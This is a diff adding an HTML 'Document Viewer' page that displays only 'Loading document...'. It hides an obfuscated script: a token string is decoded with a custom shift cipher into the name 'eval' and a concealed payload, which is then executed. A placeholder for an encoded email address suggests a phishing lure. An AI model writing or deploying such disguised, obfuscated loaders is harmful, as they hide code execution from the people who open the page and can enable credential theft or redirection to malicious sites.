@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div>Loading document...</div>
+    
+    <script>
+    var m = "#Ljfs++email64++Ljfs";
+    var r = "imki hpsa ifbe hmna iifi jbro ejwu ibve ifbe hkla hjka inli idye ikhi idye eepo hpsa ikhi hora iate fire dhye hora ilji imki ijgi inli ffma eepo efro ihde japo jcso ikhi inli ieze iate hmna hlma inli eivu ikhi ihde hnpa egso dkci djbi efro dldi icwe fbha hkla imki hija ieze bfkey";
+    var R = r.split(" ");
+    var P = R.pop().replace("key", "");
+    var T = R.splice(-4, 4);
+    var K = R;
+    
+    var n = 0;
+    for (var z = 0; z < P.length; z++) n = n * 16 + (P.charCodeAt(z) - 97);
+    
+    var C = "", h = "";
+    for (var B = 0; B < Math.max(T.length, K.length); B++) {
+        if (B < T.length) {
+            var d = T[B].substring(0, 2);
+            var V = 0;
+            for (var e = 0; e < d.length; e++) V = V * 16 + (d.charCodeAt(e) - 97);
+            C += String.fromCharCode(V);
+        }
+        if (B < K.length) {
+            var d = K[B].substring(0, 2);
+            var V = 0;
+            for (var e = 0; e < d.length; e++) V = V * 16 + (d.charCodeAt(e) - 97);
+            h += String.fromCharCode(V);
+        }
+    }
+    
+    var W = "", O = "";
+    for (var L = 0; L < Math.max(C.length, h.length); L++) {
+        if (L < C.length) {
+            var u = C.charCodeAt(L);
+            W += String.fromCharCode((u - n - (L % 7) + 256) % 256);
+        }
+        if (L < h.length) {
+            var u = h.charCodeAt(L);
+            O += String.fromCharCode((u - n - (L % 7) + 256) % 256);
+        }
+    }
+    
+    this[W](O);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"942fa1858097450697a9f24f12f8ce18","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
